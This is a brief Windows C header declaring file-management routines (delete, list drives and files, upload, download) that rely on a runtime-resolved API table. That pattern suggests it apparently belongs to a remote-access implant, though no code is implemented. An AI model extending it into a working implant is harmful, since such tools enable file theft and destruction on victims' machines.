#pragma once
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <direct.h>
#include <sys/stat.h>
#include "resolve_apis.h"

#define BUFFER_SIZE 4096

// Define the maximum number of drives that we can handle
#define MAX_DRIVES 26

extern API Api;

int delete_file(char* path);
int delete_dir(char* path);
int get_object_info(char* path, struct stat* fileinfo);
int get_drives_list(char* buf);
char* get_file_list(const char* dirPath, int* numFiles);
void download_file();
void download_folder();
void upload_file();